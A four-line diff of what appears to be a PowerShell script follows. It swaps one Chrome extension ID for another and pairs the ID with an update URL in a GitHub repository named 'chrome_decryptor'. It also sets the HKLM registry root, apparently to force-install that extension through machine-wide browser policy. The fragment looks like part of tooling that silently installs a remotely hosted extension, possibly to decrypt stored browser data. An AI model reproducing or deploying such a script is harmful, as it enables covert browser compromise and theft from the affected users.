@@ -1,4 +1,4 @@
-$extId = "pccofikgeelbcjceafhplckmeajojgde"
+$extId = "oihkjppelmofdfenjbmbhiamlcejahgm"
 $xmlUrl = "https://raw.githubusercontent.com/tn2g4fh-alt/chrome_decryptor/refs/heads/main/update.xml"
 $policyValue = "$extId;$xmlUrl"
 $HKLM = [uint32]2147483650
